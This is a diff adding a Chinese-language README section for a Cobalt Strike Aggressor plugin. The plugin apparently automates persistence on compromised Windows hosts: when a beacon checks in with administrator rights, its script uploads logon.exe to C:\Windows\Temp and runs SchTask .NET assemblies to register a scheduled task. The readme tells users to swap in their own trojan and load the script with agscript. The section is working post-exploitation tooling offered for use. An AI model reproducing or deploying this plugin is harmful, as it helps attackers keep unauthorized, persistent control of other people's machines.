@@ -1,3 +1,47 @@
+# 简单加个cobalt strike插件
+
+
+
+简单加个cobalt strike插件，上线机器自动执行SchTask，麻麻再也不用担心手速不够没法维权了。
+
+上线机器判断是否管理员权限，然后上传目录下的logon.exe到C:\\Windows\\Temp\\，bexecute_assembly参数执行SchTask。
+
+```
+# set up the Initial check
+on beacon_initial {
+  if (-isadmin $1) {
+    bls($1, "C:\\Windows\\Temp\\", &callback);
+  }
+}
+
+sub callback {
+      $flag = "logon.exe";
+      if ($flag !isin $3){
+        bcd($1, "C:\\Windows\\Temp\\");
+        bupload($1, script_resource("logon.exe"));
+        bexecute_assembly($1, script_resource("SchTask_donet_v2.exe"), "C:\\Windows\\Temp\\logon.exe 23");
+        bexecute_assembly($1, script_resource("SchTask_donet_v4.exe"), "C:\\Windows\\Temp\\logon.exe 23");
+      }
+    }
+```
+
+**注：服务器donet版本，所以同时执行了v2和v4的SchTask，替换CS_InitSchTask目录下的logon.exe为自己的马，cobalt strike中Load InitSchTask.cna插件，或`./agscript [host] [port] [user] [password] [/path/to/script.cna]`使用。**
+
+PS：文件同一个目录，例如：
+
+![image-20211207210416939](README/image-20211207210416939.png)
+
+
+
+
+
+
+
+========================================假装我是分割线===================================================
+
+
+
+
 
 ![logo](./imgs/logo.png)
 
